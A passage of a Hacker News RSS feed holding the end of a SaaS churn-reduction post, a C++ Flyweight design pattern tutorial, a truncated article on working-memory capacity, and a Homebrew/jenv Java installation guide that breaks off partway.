href="https://www.palabra.io/?utm_medium=reduce-churn-saas&amp;utm_source=blog">Palabra</a> we’ve tried different formulas to reduce customer attrition. We're still working on it, but we have found a couple of strategies that worked for us even at an early stage.</p><h3>📌 Actively listen</h3><p>Build the habit of listening to what your clients have to say about your services. They can help you see things that you might be overlooking.</p><p>We like to apply surveys, because we think they are a great way to communicate with our audience. And when you are analyzing churn rate, you should especially use exit surveys. Take into account that they should be short, three questions at most.</p><p>But nothing like an old fashion call to really listen to what they have to say.</p><p>In that way, customer service is your most valuable player, your first line of attack. It’s crucial that, once your customers acquire your services, they feel valued and understood. A happy customer is the best advertising that you can get.</p><h3>📌 Segmentation. Segmentation. Segmentation</h3><p>It's a golden rule that your product should be delivered to the right person, or else you're wasting your time and your money.</p><p>A segmented customer base will aid you in making your services and products more effective. It makes it easier to recognize the requirements that they need.</p><p>Targeting too many clients can backfire. The best thing is to focus on the clients that align with the focus of your business.</p><p>For example: integrations with their favourite platforms. Here in Palabra our public started being exclusively the no-code community, so we started by integrating to their most used platforms, like Webflow, Zapier and Airtable. </p><p>As we started getting some customers with coded products, like other SaaS businesses, we created features to integrate to their preferred apps, like Segment, Hubspot or even direct webhooks integrations.</p><p>✨Remember: deliver the right product or service to the right user.✨</p><h3>📌 Focus on early engagement</h3><p>This is an obvious one, but to prevent churn you have to start working on retention as soon as possible. For that purpose, onboarding strategies work quite well.</p><p>As soon as users sign up for your product, this is the most important moment to engage with them. It’s that moment when they don’t necessarily understand the product quite well and, therefore, can’t take full advantage of it.</p><p>Provide value for your customers as soon as possible and you will win.</p><p>At <a href="https://www.palabra.io/?utm_medium=reduce-churn-saas&amp;utm_source=blog">Palabra</a> we are constantly trying to improve 3 things in our <strong>onboarding:</strong> </p><ul><li>Product: work on UX to make it as easy as possible for people to find their value in your product. We created simple user flows so that automating and triggering emails can be done in a couple of minutes</li><li>Welcoming sequences: Encourage your users to interact with your product multiple times in the first week. Sending automated emails with tutorials could be an excellent method to achieve that (you can use Palabra to create those sequences pretty easily 😉)</li><li>Customer success: make every user feel as important as they are to you. In-app chats are the obvious choices to engage with users as quickly as possible (we've used Crisp and Intercom for that). And quick direct answers are always the best way to go. This gets harder as you grow your user base, but it's always something to keep in mind.</li></ul><p>Now that you know the churn rate basics, you can start to develop strategies to boost your retention engagement and build long term relationships with your customers! 🙌🏾</p><hr><p>Hope you enjoyed this post! If you are curious about what you can do with Palabra or would just like to try it go ahead an <a href="https://www.palabra.io/?utm_medium=reduce-churn-saas&amp;utm_source=blog">create an account here</a>.</p></section></div>]]>
            </description>
            <link>https://blog.palabra.io/reduce-churn-saas</link>
            <guid isPermaLink="false">hacker-news-small-sites-24544259</guid>
            <pubDate>Mon, 21 Sep 2020 15:03:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Flyweight Design Pattern in Modern C++]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24544134">thread link</a>) | @IndianWestCoast
<br/>
September 21, 2020 | http://www.vishalchovatiya.com/flyweight-design-pattern-in-modern-cpp/ | <a href="https://web.archive.org/web/*/http://www.vishalchovatiya.com/flyweight-design-pattern-in-modern-cpp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2892"><div><p><img width="960" height="399" src="https://secureservercdn.net/160.153.137.218/bkh.972.myftpupload.com/wp-content/uploads/Flyweight-Design-Pattern-in-Modern-C-vishal-chovatiya.png?time=1600596654" alt="Flyweight Design Pattern in Modern C++ vishal chovatiya" loading="lazy" srcset="https://secureservercdn.net/160.153.137.218/bkh.972.myftpupload.com/wp-content/uploads/Flyweight-Design-Pattern-in-Modern-C-vishal-chovatiya.png 960w, https://secureservercdn.net/160.153.137.218/bkh.972.myftpupload.com/wp-content/uploads/Flyweight-Design-Pattern-in-Modern-C-vishal-chovatiya-300x125.png 300w, https://secureservercdn.net/160.153.137.218/bkh.972.myftpupload.com/wp-content/uploads/Flyweight-Design-Pattern-in-Modern-C-vishal-chovatiya-768x319.png 768w, https://secureservercdn.net/160.153.137.218/bkh.972.myftpupload.com/wp-content/uploads/Flyweight-Design-Pattern-in-Modern-C-vishal-chovatiya-480x200.png 480w" sizes="(max-width: 960px) 100vw, 960px"></p><div data-initials=""> <p><span><span>Reading Time: </span> <span>4</span> <span>minutes</span></span></p><p>Flyweight Design Pattern is a Structural Design Pattern that<strong><em> concerned with space optimization</em></strong>. It is a technique to minimizes memory footprint by sharing or avoiding redundancy as much as possible with other similar objects. Flyweight Design Pattern in Modern C++ is often used in a situation where object count is higher which uses an unacceptable amount of memory. Often some parts of these objects can be shared &amp; kept in common data structures that can be used by multiple objects.</p><p>If you haven’t check out my other articles on Structural Design Patterns, then here is the list:</p><ol><li><strong><a rel="noreferrer noopener" href="http://www.vishalchovatiya.com/adapter-design-pattern-in-modern-cpp/" target="_blank"><span>Adapter</span></a></strong></li><li><strong><a rel="noreferrer noopener" href="http://www.vishalchovatiya.com/bridge-design-pattern-in-modern-cpp/" target="_blank"><span>Bridge</span></a></strong></li><li><strong><a rel="noreferrer noopener" href="http://www.vishalchovatiya.com/composite-design-pattern-in-modern-cpp/" target="_blank"><span>Composite</span></a> </strong></li><li><strong><a rel="noreferrer noopener" href="http://www.vishalchovatiya.com/decorator-design-pattern-in-modern-cpp/" target="_blank"><span>Decorator</span></a> </strong></li><li><strong><a rel="noreferrer noopener" href="http://www.vishalchovatiya.com/facade-design-pattern-in-modern-cpp/" target="_blank"><span>Facade</span></a></strong></li><li><strong><a rel="noreferrer noopener" href="http://www.vishalchovatiya.com/flyweight-design-pattern-in-modern-cpp/" target="_blank"><span>Flyweight</span></a> </strong></li><li><strong><a rel="noreferrer noopener" href="http://www.vishalchovatiya.com/proxy-design-pattern-in-modern-cpp/" target="_blank"><span>Proxy</span></a></strong></li></ol><p>The code snippets you see throughout this series of articles are simplified not sophisticated. So you often see me not using keywords like <code>override</code>, <code>final</code>, <code>public</code>(while inheritance) just to make code compact &amp; consumable(most of the time) in single standard screen size. I also prefer <code>struct</code> instead of <code>class</code> just to save line by not writing “<code>public:</code>” sometimes and also miss <a rel="noreferrer noopener" aria-label="virtual destructor (opens in a new tab)" href="http://www.vishalchovatiya.com/part-3-all-about-virtual-keyword-in-c-how-virtual-destructor-works/" target="_blank"><span>virtual destructor</span></a>, constructor, <a href="http://www.vishalchovatiya.com/all-about-copy-constructor-in-cpp-with-example/" target="_blank" rel="noreferrer noopener" aria-label="copy constructor (opens in a new tab)"><span>copy constructor</span></a>, prefix <code>std::</code>, deleting dynamic memory, intentionally. I also consider myself a pragmatic person who wants to convey an idea in the simplest way possible rather than the standard way or using Jargons.</p><p><strong><em>Note:</em> </strong></p><ul><li>If you stumbled here directly, then I would suggest you go through <a href="http://www.vishalchovatiya.com/what-is-design-pattern/" target="_blank" rel="noreferrer noopener"><span>What is design pattern?</span></a> first, even if it is trivial. I believe it will encourage you to explore more on this topic.</li><li>All of this code you encounter in this series of articles are compiled using C++20(though I have used <a rel="noreferrer noopener" aria-label="Modern C++ (opens in a new tab)" href="http://www.vishalchovatiya.com/21-new-features-of-modern-cpp-to-use-in-your-project/" target="_blank"><span>Modern C++</span></a> features up to C++17 in most cases). So if you don’t have access to the latest compiler you can use <a rel="noreferrer noopener" aria-label="https://wandbox.org/ (opens in a new tab)" href="https://wandbox.org/" target="_blank"><span>https://wandbox.org/</span></a> which has preinstalled boost library as well.</li></ul><h2><span id="Intent">Intent </span></h2><p><strong><em>To avoid redundancy when storing data</em></strong>.</p><ul><li>Flyway Design Pattern is quite simply a space optimization technique. That allows you to use less memory by storing some of the common data to several items or several <a href="http://www.vishalchovatiya.com/memory-layout-of-cpp-object/" target="_blank" rel="noreferrer noopener" aria-label="object (opens in a new tab)"><span>object</span></a>s.</li><li>We store it externally and simply refer(by reference, pointer or any other mechanism) to it when we actually need it.</li></ul><h2><span id="Flyweight_Design_Pattern_Example_in_C">Flyweight Design Pattern Example in C++</span></h2><ul><li>Well, the one thing that we want to do if we’re storing lots of data is to avoid any redundancy. It’s like compression in images or films if you have the same block repeating over and over again. You probably want to actually avoid having that block take up memory. But instead, you just write it and say how many times it repeats.</li><li>For example, let say you are designing a game. You’re going to have lots of users with identical first and/or last names. You are going to have lots of people called `John Smith`. But you’re also going to have lots of people called `John` and lots of people whose last name is `Smith`.</li><li>And there are no point in actually storing the same first &amp; last name combinations over &amp; over again. Because you are simply wasting memory. So what you would do instead is you would store a list of names somewhere else. And then you would keep the pointers to those names.</li></ul><pre data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// Note: You can try following code at  https://wandbox.org/. 
#include &lt;boost/bimap.hpp&gt;

struct User {
    User(string f, string l) : m_first_name{add(f)}, m_last_name{add(l)} { }

    string get_first_name() {return names.left.find(m_first_name)-&gt;second;}
    string get_last_name() {return names.left.find(m_last_name)-&gt;second;}

    friend ostream&amp; operator&lt;&lt;(ostream&amp; os, User&amp; obj) {
        return os &lt;&lt;
            obj.get_first_name() &lt;&lt; "(id=" &lt;&lt; obj.m_first_name &lt;&lt; "), " &lt;&lt;
            obj.get_last_name() &lt;&lt; "(id=" &lt;&lt; obj.m_last_name &lt;&lt; ")" ;
    }

protected:
    using key = uint32_t;
	static boost::bimap&lt;key, string&gt;        names;
    static key                              seed;

    static key add(string s) {
        auto it = names.right.find(s);
        if (it == names.right.end()) {
            names.insert({++seed, s});
            return seed;
        }
        return it-&gt;second;
    }

    key     m_first_name, m_last_name;
};

User::key                           User::seed = 0;
boost::bimap&lt;User::key, string&gt;     User::names{};

int main() {
    User john_doe {"John","Doe"};
    User jane_doe {"Jane","Doe"};

    cout &lt;&lt; "John Details: " &lt;&lt; john_doe &lt;&lt; endl;
    cout &lt;&lt; "Jane Details: " &lt;&lt; jane_doe &lt;&lt; endl;

    return EXIT_SUCCESS;
}
/*
John Details: John(id=1), Doe(id=2)
Jane Details: Jane(id=3), Doe(id=2)
*/</pre><ul><li>If you see the essence from above flyweight implementation, it just storing data in the static qualified data structure by taking care of redundancy. So that it can be reusable between multiple objects of the same <a href="http://www.vishalchovatiya.com/cpp-type-casting-with-example-for-c-developers/" target="_blank" rel="noreferrer noopener" aria-label="type (opens in a new tab)"><span>type</span></a>.</li></ul><h2><span id="Implementing_Flyweight_Design_Pattern_using_Boost">Implementing Flyweight Design Pattern using Boost </span></h2><ul><li>The Flyweight Design Pattern isn’t exactly new. And this approach of caching information is something that people have already packaged into different libraries for you to use.</li><li>So instead of building all these wonderful by maps and whatnot what you can do is just use a library solution.</li></ul><pre data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#include &lt;boost/flyweight.hpp&gt;

struct User {
	boost::flyweight&lt;string&gt;   m_first_name, m_last_name;

	User(string f, string l) : m_first_name(f), m_last_name(l) { }
};

int main() {
	User john_doe{ "John", "Doe" };
	User jane_doe{ "Jane", "Doe" };

	cout&lt;&lt;boolalpha ;
	cout&lt;&lt;(&amp;jane_doe.m_first_name.get() == &amp;john_doe.m_first_name.get())&lt;&lt;endl;    // False
	cout&lt;&lt;(&amp;jane_doe.m_last_name.get() == &amp;john_doe.m_last_name.get())&lt;&lt;endl;      // True

	return EXIT_SUCCESS;
}
// Try @ https://wandbox.org/. </pre><ul><li>As you can see, we are comparing the address of John’s last name &amp; Jane’s last name in the <code>main()</code> function which prints out to be true if you run the above code suggesting that redundancy is perfectly taken cared by <code><a href="https://www.boost.org/doc/libs/1_62_0/libs/flyweight/doc/index.html"><span>boost::flyweight&lt;&gt;</span></a></code>.</li></ul><h2><span id="Benefits_of_Flyweight_Design_Pattern">Benefits of Flyweight Design Pattern</span></h2><ol><li>Facilitates the reuse of many fine-grained objects, making the utilization of large numbers of objects more efficient. – verbatim GoF.</li><li>Improves data caching for higher response time.</li><li>Data caching intern increases performance due to a lesser number of heavy objects</li><li>Provide a centralized mechanism to control the states/common-attributes objects.</li></ol><h2><span id="Summary_by_FAQs">Summary by FAQs</span></h2><div><div id="faq-question-1576476528345"><p><strong>When to use a Flyweight Design Pattern?</strong></p><p>– In need of a large number of objects<br>– When there is a repetitive creation of heavy objects which can be replaced by a few shared objects</p></div><div id="faq-question-1576476530221"><p><strong>Difference between Singleton and Flyweight Design Pattern?</strong></p><p>– In Singleton Design Pattern, you cannot create more than one object. You need to reuse the existing object in all parts of the application.<br>– While in Flyweight Design Pattern you can have a large number of similar objects which can share a common single resource.</p></div><div id="faq-question-1576476535947"><p><strong>Drawbacks of Flyweight Design Pattern?</strong></p><p>As similar to Singleton Design Pattern, concurrency is also a headache in the Flyweight Design Pattern. Without appropriate measures, if you create  Flyweight objects in a concurrent environment, you may end up having multiple instances of the same object which is not desirable.</p></div></div><p><strong>Do you like it☝️? Get such articles directly into the inbox…!</strong>📥<br></p></div></div></article></div>]]>
            </description>
            <link>http://www.vishalchovatiya.com/flyweight-design-pattern-in-modern-cpp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24544134</guid>
            <pubDate>Mon, 21 Sep 2020 14:51:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[3 Basic Rules of Productivity]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24544084">thread link</a>) | @iuliangulea
<br/>
September 21, 2020 | https://iuliangulea.com/blog/how-people-learn-3-basic-rules-of-productivity/ | <a href="https://web.archive.org/web/*/https://iuliangulea.com/blog/how-people-learn-3-basic-rules-of-productivity/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    
    <p><img src="https://iuliangulea.com/images/how-people-learn/working-memory/3-basic-rules-of-productivity-cover.png" alt="3 Basic Rules Of Productivity Cover"></p>
<p>Have you ever wondered what happens inside our brain whenever we are thinking about something? How some people have great ideas, are able to learn fast, and are incredibly productive, while others are struggling with finalizing even a simple task? There are many components to this process, and in this article, you will learn about one of them.</p>
<p>Working Memory is one of the <a href="https://iuliangulea.com/blog/how-people-learn-memory-storage-types/">several memory types</a> where information is processed and manipulated before it is either discarded or committed to the long-term storage. Understanding its nuances can allow us to be more efficient in using it and be a bit more productive at what we do.</p>
<p>And since it is at the core of information processing by our brain, the things you are about to learn are independent of the domain you are working in.</p>
<h2 id="an-strikeirstrikerelevant-example-first">An <strike>Ir</strike>relevant Example First</h2>
<p>I don’t know how many articles online make you do exercises, but let’s do one right now. Moreover, I count on your integrity to follow the exercise’s directions since I cannot check you play by the rules.</p>
<h3 id="exercise-description">Exercise Description</h3>
<p>You will see below two blank boxes. Upon clicking on “Show Letters,” you will see two sequences (one after another) of random characters for 7 seconds each.</p>
<p><em>Rule # 1:</em> after you click on the button, you have 7 seconds to read and memorize the first sequence, and 7 seconds for the second one (the sequences will display automatically, you only have to click on the button once).
<em>Rule #2:</em> do not use any note-taking software (doc, excel, text editor, etc.) or hardware (pen and paper, pen and table, pen and walls; a pencil if fine though!). Well, you can, but you will miss the whole point of it.</p>

<p>abcdlmnowxyz</p>
<p>gdluwcemjroc</p>   
<p>Great! How it went? Sorry if you tried to click on a box the second time, and it didn’t show up. I put some sophisticated locking mechanisms in place to prevent that.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p>
<p>Now, there are two more boxes below. Click on each of them, input the characters you memorized, and see how good you have performed on the task.</p>
<div id="boxAnswer1">
    
    <div id="comparisonData1">
        <p>abcdlmnowxyz</p>
        <p>&lt;-- Original sequence</p>
    </div>
    
</div>
<div id="boxAnswer2">
    
    <div id="comparisonData2">
        <p>gdluwcemjroc</p>
        <p>&lt;-- Original sequence</p>
    </div>
    
</div>   
<p>If you got neither of them correctly, do not worry. 7 seconds is quite fast, and, as you will see next, the capacity of Working Memory is limited.</p>
<p>If you did remember only the first one, though, how did you do it? Most people usually memorize it as three distinct subsets: <code>abcd</code> <code>lmno</code> <code>wxyz</code>. It is relatively easy to remember it because of several reasons:</p>
<ul>
<li>instead of 12 units of information (characters, in this case), you had to memorize much less (3 letters and the length of the groups–4);</li>
<li>you have inherent knowledge about the alphabet (if you, dear reader, are older than 6 years);</li>
<li>you have advanced <a href="https://en.wikipedia.org/wiki/Pattern_recognition_(psychology)">pattern recognition</a> abilities that help you discern and group units of information into collections;</li>
</ul>
<p>But what about the second sequence?</p>
<p>How did you attempt to memorize it? Maybe you have split the characters into chunks of 3 or 4 letters and tried to remember the groups, or perhaps you made words out of different adjacent letters and memorized those, or even you came up with a totally different strategy. Anyway, it is usually harder to remember the second sequence. And that is because the amount of information exceeded the capacity of our Working Memory. You had to memorize 12 units of information (or had to search anxiously for some associations to find a way to group those letters), while you have much less space to process at once in such a short period of time.</p>
<p>Let’s do one more similar exercise, but this time with numbers.</p>

<p>193919451969</p>
<p>826492104350</p>   
<p>How did it go? You can verify your answers below.</p>
<div id="boxAnswer3">
    
    <div id="comparisonData3">
        <p>193919451969</p>
        <p>&lt;-- Original sequence</p>
    </div>
    
</div>
<div id="boxAnswer4">
    
    <div id="comparisonData4">
        <p>826492104350</p>
        <p>&lt;-- Original sequence</p>
    </div>
    
</div>   

   
<p>There are two main approaches to store the first sequence of digits. The first is to combine them by 2, getting 19, 39, 19, 45, 19, and 69. You have 19 repeating three times, a 39 and 69 that are divisible by three, and a 45 that you just have to remember. But this approach is suboptimal. A more efficient one is to group them by four and use some knowledge of history. You can represent that sequence as three numbers: <code>1939</code>, <code>1945</code>, and <code>1969</code>. The first two are the start and end of the Second World War, and the third is the year of the <a href="https://en.wikipedia.org/wiki/Apollo_11">Apollo 11 moon landing</a>. So you just need to remember three chunks of information rather than 12. It is another demonstrative example that shows how our brain not only seeks to encode and compress information (as in the previous example with the first character sequence), but also it heavily relies on existing knowledge (as in the case with the WWII and moon landing years). The approaches you take may also vary in their efficiency.</p>
<p>The second one does not have any specific pattern to follow. Maybe you divided the sequence into groups of two or three or even four digits, or perhaps you tried to find a rule to group them. For instance, 82 add up to 10, then 64 add up to 10, but it’s not consistent. You’ll arrive at 92, and it doesn’t add up to 10. The approaches can be very different here, but the conclusion is the same - the second sequence is harder to remember because there is no exact rule or compression algorithm that would facilitate the remembering.</p>
<h2 id="the-working-memory-capacity">The Working Memory Capacity</h2>
<p>We saw that it is hard to memorize a sequence of 12 items, which implies that its capacity should be smaller than that, as otherwise, you would effortlessly remember those 12 pieces of information. But how <strike>big</strike> small is it?</p>
<p>The first quantification of the working memory capacity was provided in 1956 in a paper by George A. Miller titled: <em>“The Magical Number Seven, Plus or Minus Two: Some Limits on Our Capacity for Processing Information."</em> It is one of the most highly cited papers in psychology<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> with over 33400 papers that cited it (at the time of writing), according to <a href="https://scholar.google.com/scholar?hl=en&amp;as_sdt=0%2C5&amp;q=The+magical+number+seven%2C+plus+or+minus+two%3A+Some+limits+on+our+capacity+for+processing+information.&amp;btnG=">Google Scholar</a>. In his paper, Miller claims the working memory capacity to be 7±2 “chunks,” to which I’ll get shortly.</p>
<p>But since 1956, the Working Memory was actively researched and studied, and other theories of its capacity emerged. One such prominent hypothesis is that of Nelson Cowan, who in 2001 published the paper titled <em>“The magical number 4 in short-term memory: A reconsideration of mental storage capacity,"</em> in which, you guessed, he suggests a smaller capacity of <em>four chunks.</em></p>
<h2 id="what-is-a-chunk-anyway">What Is A Chunk Anyway?</h2>
<p>Since we can store a very limited amount of chunks in the Working Memory for processing, how does one define a <em>chunk?</em></p>
<p>Unfortunately, there is no concrete answer to this question because it is a relative measure that depends on the type of information and the pre-existing knowledge of the person who operates with it.</p>
<p>It can vary greatly:</p>
<ul>
<li>If you are not familiar with the Russian language, the sequence <code>плюшечка</code> would result in a chunk being the size of an individual letter (or even less), since you don’t have implicit knowledge about it. However, it would represent a single chunk for a Russian speaking person since it is a real word (in a diminutive form).</li>
<li>Distinct words such as <em>job, emotion, productivity</em> may represent single chunks.<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup></li>
<li>Combinations of words like <em>“The Fellowship Of The Ring,” “The Two Towers,” “The Return Of The King”</em> can also be considered individual chunks.</li>
<li>Entire sentences can also represent chunks: “Today, I went to the seaside.” or “I am a responsible citizen, and I will vote.”</li>
<li>When thinking about them holistically, even entire chapters and books may represent single chunks, as in the Lord Of The Rings trilogy mentioned above.</li>
</ul>
<p>As you can see, there is no exact size for a chunk, as it depends on different factors, such as:</p>
<ul>
<li>familiarity with the topic;</li>
<li>complexity of the concept;</li>
<li>one’s mental agility;</li>
</ul>
<p>But chunks are not represented only by words on paper or screen:</p>
<ul>
<li>Chess players store groups of pieces together when they are asked to reproduce a chess arrangement from memory onto an empty chessboard.<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup> Therefore, a chunk represents the position of several figures at once.</li>
<li>Solving a simple math equation like <code>8 * 3 - 42 / 2 = ?</code> requires an iterative approach to load the operands with the highest priority (8 and 3) and the operation to perform (multiplication), then solve that simple equation and store the result in the WM (24), repeat with next pair of operands (42 / 2), hold the result (21), and finally, repeat one more time, by accessing the results of the two simple operations in the WM and doing the subtraction (24 - 21) to get 3.</li>
<li>Attending a meeting requires keeping different presented ideas in mind to reason about them, make connections with one’s own thoughts, or doing tons of other stuff with them.</li>
</ul>
<h2 id="navigating-the-hierarchical-structure-of-information-within-a-complex-network-of-associations">Navigating The Hierarchical Structure Of Information Within A Complex Network Of Associations</h2>
<p>You might wonder how a chunk may be represented by a single word as well as a whole book? After all, the amount of information differs immensely.</p>
<p>The idea here is how data is represented in our long-term memory and the agility of our Working Memory to combine information. The processes I have described run seamlessly and fast. When we read a sentence (not a random list of words), we expect a specific structure that we are very good at understanding. We know there is usually an action, an object, and a subject in a sentence.</p>
<p>So, when we read words, our Working Memory combines parts of the sentence into chunks and stores them in one of the four available memory slots. Then, once you are done reading a sentence, WM extracts all the relevant pieces that belong to the sentence you just read, combines them into a <em>superchunk,</em> and stores it in a single memory slot or even enter it into the long-term memory. Once you have read a paragraph, you combine several sentence superchunks into one, store it, and repeat the entire process. You thus create a hierarchy of information.</p>
<p><img src="https://iuliangulea.com/images/how-people-learn/working-memory/hierarchical-information.png" alt="Image of information hierarchy"></p>
<p>You can navigate it up and down. Say, you discuss the events described in the “Lord Of The Rings: The Fellowship Of The Ring” book with …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://iuliangulea.com/blog/how-people-learn-3-basic-rules-of-productivity/">https://iuliangulea.com/blog/how-people-learn-3-basic-rules-of-productivity/</a></em></p>]]>
            </description>
            <link>https://iuliangulea.com/blog/how-people-learn-3-basic-rules-of-productivity/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24544084</guid>
            <pubDate>Mon, 21 Sep 2020 14:47:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to install Java with brew and jenv]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24543960">thread link</a>) | @appwiz
<br/>
September 21, 2020 | https://kenanhancer.com/2020/05/09/how-to-install-java-with-brew-and-jenv/ | <a href="https://web.archive.org/web/*/https://kenanhancer.com/2020/05/09/how-to-install-java-with-brew-and-jenv/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p><code>jenv</code>&nbsp;is a tool that helps you switch between different java versions in your development machine. But, Jenv doesn't install Java for you.</p>



<p>Use your platform appropriate package manager to install&nbsp;<code>Java</code>. On macOS,&nbsp;<code>brew</code>&nbsp;is recommended.</p>



<h3>Install Java with Homebrew</h3>



<p>First, ensure that you have&nbsp;<a rel="noreferrer noopener" href="https://brew.sh/" target="_blank">Homebrew</a>&nbsp;installed in your system. Homebrew is a package manager for Mac OS.</p>



<figure></figure>



<p>I also posted how to install Java JDK manually in the following post.</p>



<figure></figure>



<p>Actually I already mentioned how to install Java JDK in the above post, but I will shortly show one more time</p>



<pre><code>$ brew tap adoptopenjdk/openjdk</code></pre>



<pre><code>$ brew search jdk

==&gt; Formulae
openjdk                                                                              openjdk@11

==&gt; Casks
adoptopenjdk
adoptopenjdk12
adoptopenjdk13-openj9
adoptopenjdk14-openj9-jre-large
adoptopenjdk9
adoptopenjdk10
adoptopenjdk12-jre
adoptopenjdk13-openj9-jre
adoptopenjdk14-openj9-large
jdk-mission-control
adoptopenjdk11
adoptopenjdk12-openj9
adoptopenjdk13-openj9-jre-large
adoptopenjdk8
oracle-jdk
adoptopenjdk11-jre
adoptopenjdk12-openj9-jre
adoptopenjdk13-openj9-large
adoptopenjdk8-jre
oracle-jdk-javadoc
adoptopenjdk11-openj9
adoptopenjdk12-openj9-jre-large
adoptopenjdk14
adoptopenjdk8-openj9
sapmachine-jdk
adoptopenjdk11-openj9-jre
adoptopenjdk12-openj9-large
adoptopenjdk14-jre
adoptopenjdk8-openj9-jre
adoptopenjdk11-openj9-jre-large
adoptopenjdk13
adoptopenjdk14-openj9
adoptopenjdk8-openj9-jre-large
adoptopenjdk11-openj9-large
adoptopenjdk13-jre
adoptopenjdk14-openj9-jre
adoptopenjdk8-openj9-large</code></pre>



<pre><code>$ brew cask install adoptopenjdk</code></pre>



<pre><code>$ java --version

openjdk 14.0.1 2020-04-14
OpenJDK Runtime Environment AdoptOpenJDK (build 14.0.1+7)
OpenJDK 64-Bit Server VM AdoptOpenJDK (build 14.0.1+7, mixed mode, sharing)</code></pre>



<p>We need to add the below function in your&nbsp;<code>~/.bashrc</code>&nbsp;or&nbsp;<code>~/.zshrc</code> so that we can switch between different Java versions.</p>



<pre><code>jdk() {
        version=$1
        export JAVA_HOME=$(/usr/libexec/java_home -v"$version");
        java -version
 }</code></pre>



<p>and run the following code to source</p>



<pre><code>$ source ~/.zshrc</code></pre>



<p>or</p>



<pre><code>$ source ~/.bashrc</code></pre>



<p>Let's install Java JDK 10</p>



<pre><code>$ brew cask install adoptopenjdk10</code></pre>



<pre><code>$ jdk 10</code></pre>



<p>That's all 🙂</p>



<h3>Installing Jenv</h3>



<h4>Linux / OS X</h4>



<pre><code>$ git clone https://github.com/gcuisinier/jenv.git ~/.jenv</code></pre>



<h4>Mac OS X via&nbsp;<a href="http://brew.sh/">Homebrew</a></h4>



<pre><code>$ brew install jenv</code></pre>



<h4>Bash</h4>



<pre><code>$ echo 'export PATH="$HOME/.jenv/bin:$PATH"' &gt;&gt; ~/.bash_profile
$ echo 'eval "$(jenv init -)"' &gt;&gt; ~/.bash_profile</code></pre>



<h4>Zsh</h4>



<pre><code>$ echo 'export PATH="$HOME/.jenv/bin:$PATH"' &gt;&gt; ~/.zshrc
$ echo 'eval "$(jenv init -)"' &gt;&gt; ~/.zshrc</code></pre>



<p>Restart your shell by closing and reopening your terminal window.</p>



<h4>To verify&nbsp;<code>jenv</code>&nbsp;was installed</h4>



<pre><code>$ jenv doctor

[OK]	JAVA_HOME variable probably set by jenv PROMPT
[OK]	Java binaries in path are jenv shims
[OK]	Jenv is correctly loaded</code></pre>



<h4>To make sure&nbsp;<code>JAVA_HOME</code>&nbsp;is set, make sure to enable the&nbsp;<code>export</code>&nbsp;plugin</h4>



<pre><code>$ jenv enable-plugin export</code></pre>



<pre><code>$ jenv enable-plugin maven</code></pre>



<h4>Adding Your Java Environment</h4>



<p>I will install Java JDK from 8 to 14. They are installed in /<strong>Library/Java/JavaVirtualMachines/</strong> folder</p>



<pre><code>$ brew cask install adoptopenjdk8

==&gt; Downloading https://github.com/AdoptOpenJDK/openjdk8-binaries/releases/download/jdk8u252-b09.1/OpenJDK8U-jdk_x64_mac_hotspot_8u252b09.pkg
Already downloaded: /Users/kenanhancer/Library/Caches/Homebrew/downloads/57a6643f7b6de270e63dfc545e0d665dc6de2c7081f7537ffba2ccdbdae46d2d--OpenJDK8U-jdk_x64_mac_hotspot_8u252b09.pkg
==&gt; Verifying SHA-256 checksum for Cask 'adoptopenjdk8'.
==&gt; Uninstalling Cask adoptopenjdk8
==&gt; Uninstalling packages:
net.adoptopenjdk.8.jdk
==&gt; Purging files for version 8,252:b09.1 of Cask adoptopenjdk8
==&gt; Installing Cask adoptopenjdk8
==&gt; Running installer for adoptopenjdk8; your password may be necessary.
==&gt; Package installers may write to any location; options such as --appdir are ignored.
installer: Package name is AdoptOpenJDK
installer: Upgrading at base path /
installer: The upgrade was successful.
package-id: net.adoptopenjdk.8.jdk
version: 1.8.0_252-b09
volume: /
location: Library/Java/JavaVirtualMachines/adoptopenjdk-8.jdk
install-time: 1589071635
🍺  adoptopenjdk8 was successfully installed!</code></pre>



<pre><code>$ brew cask install adoptopenjdk9</code></pre>



<pre><code>$ brew cask install adoptopenjdk10</code></pre>



<pre><code>$ brew cask install adoptopenjdk11</code></pre>



<pre><code>$ brew cask install adoptopenjdk12</code></pre>



<pre><code>$ brew cask install adoptopenjdk13</code></pre>



<pre><code>$ brew cask install adoptopenjdk14</code></pre>



<h4>Adding installed Java JDK paths to jenv</h4>



<pre><code>$ jenv add /Library/Java/JavaVirtualMachines/adoptopenjdk-8.jdk/Contents/Home</code></pre>



<pre><code>$ jenv add /Library/Java/JavaVirtualMachines/adoptopenjdk-9.jdk/Contents/Home</code></pre>



<pre><code>$ jenv add /Library/Java/JavaVirtualMachines/adoptopenjdk-10.jdk/Contents/Home</code></pre>



<pre><code>$ jenv add /Library/Java/JavaVirtualMachines/adoptopenjdk-11.jdk/Contents/Home</code></pre>



<pre><code>$ jenv add /Library/Java/JavaVirtualMachines/adoptopenjdk-12.jdk/Contents/Home</code></pre>



